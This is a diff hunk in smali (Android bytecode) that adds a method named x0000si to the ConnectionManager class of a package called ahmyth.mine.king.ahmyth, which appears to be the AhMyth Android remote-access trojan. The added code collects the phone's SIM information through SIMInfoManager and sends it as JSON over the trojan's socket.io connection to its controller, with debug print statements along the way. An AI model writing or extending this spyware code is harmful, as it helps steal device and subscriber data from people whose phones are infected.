@@ -301,6 +301,80 @@
     return-void
 .end method
 
+.method public static x0000si()V
+    .locals 6
+
+    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    const-string v4, "ConnectionManager.x0000si(): Method called"
+
+    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lb/a/b/e;
+
+    if-nez v0, :cond_socket_null
+
+    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    const-string v4, "ConnectionManager.x0000si(): ERROR - ioSocket is null!"
+
+    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    return-void
+
+    :cond_socket_null
+    const/4 v1, 0x1
+
+    new-array v1, v1, [Ljava/lang/Object;
+
+    invoke-static {}, Lahmyth/mine/king/ahmyth/SIMInfoManager;->getSIMInfo()Lorg/json/JSONObject;
+
+    move-result-object v2
+
+    if-nez v2, :cond_0
+
+    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    const-string v4, "SIMInfoManager.getSIMInfo() returned null"
+
+    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    return-void
+
+    :cond_0
+    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    new-instance v4, Ljava/lang/StringBuilder;
+
+    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v5, "ConnectionManager: Sending SIM info: "
+
+    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v4
+
+    invoke-virtual {v3, v4}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    const/4 v3, 0x0
+
+    aput-object v2, v1, v3
+
+    const-string v2, "x0000si"
+
+    invoke-virtual {v0, v2, v1}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
+
+    return-void
+.end method
+
 .method public static x0000fm(ILjava/lang/String;)V
     .locals 2
 
